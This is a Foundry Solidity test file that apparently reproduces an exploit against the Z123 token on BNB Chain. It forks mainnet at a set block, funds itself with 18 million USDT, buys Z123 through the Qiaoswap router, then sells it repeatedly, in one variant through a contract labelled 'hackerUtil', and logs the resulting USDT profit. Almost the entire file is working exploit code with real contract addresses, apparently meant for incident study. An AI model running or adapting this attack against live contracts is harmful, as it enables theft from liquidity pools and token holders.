// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IERC20.sol";

import "./IQiaoswap.sol";
import "./IZ123.sol";

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IZ123 constant Z123 = IZ123(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760);

// USDT/WBNB
IPancakePairV3 constant USD_BNB_Pool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
IQiaoswapV2Router02 constant QiaoswapV2Router02 = IQiaoswapV2Router02(
    payable(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD)
);
// USDT/Z123
IQiaoswapV2Pair constant QiaoZ123Pair = IQiaoswapV2Pair(
    0x93515A5Dbc2834D687721111d966DE472d682a47
);

IPancakeRouterV2 constant hackerUtil = IPancakeRouterV2(
    payable(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8)
);

address constant dead = address(0x000000000000000000000000000000000000dEaD);

contract Z123Test is Test {
    uint256 times = 2;

    function setUp() public {
        vm.createSelectFork("bsc", 38077211 - 1);
        deal(address(USDT), address(this), 18000000 ether);

        USDT.approve(address(QiaoswapV2Router02), type(uint256).max);
        Z123.approve(address(QiaoswapV2Router02), type(uint256).max);
        Z123.approve(address(hackerUtil), type(uint256).max);
    }

    function showData() public {
        emit log_named_decimal_uint("USDT balance", Z123.balanceOf(dead), 18);

        if (USDT.balanceOf(address(this)) > 18000000 ether) {
            emit log_named_decimal_uint(
                "USDT balance",
                USDT.balanceOf(address(this)) - 18000000 ether,
                18
            );
        } else {
            emit log_named_decimal_uint(
                "- USDT balance",
                18000000 ether - USDT.balanceOf(address(this)),
                18
            );
        }
    }

    function testExploit1() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(Z123);
        // get Z123 -> 575112.575667322839911395
        QiaoswapV2Router02
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                18000000 ether,
                1,
                path,
                address(this),
                block.timestamp + 1
            );

        path[0] = address(Z123);
        path[1] = address(USDT);

        for (uint256 i = 0; i < times; i++) {
            hackerUtil.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                10000 ether,
                1,
                path,
                address(this),
                block.timestamp
            );
        }

        showData();
    }

    function testExploit2() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(Z123);
        // get Z123 -> 575112.575667322839911395
        QiaoswapV2Router02
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                18000000 ether,
                1,
                path,
                address(this),
                block.timestamp + 1
            );

        path[0] = address(Z123);
        path[1] = address(USDT);

        for (uint256 i = 0; i < times; i++) {
            QiaoswapV2Router02
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    10000 ether,
                    1,
                    path,
                    address(this),
                    block.timestamp + 1
                );
        }

        showData();
    }

    function showPrice() public {
        // Z123’s price = reserve0 / reserve1
        (uint112 reserve0, uint112 reserve1, ) = QiaoZ123Pair.getReserves();
        uint256 price = (reserve1 * 1e6) / reserve0;
        emit log_named_decimal_uint("Price", price, 6);
    }
}
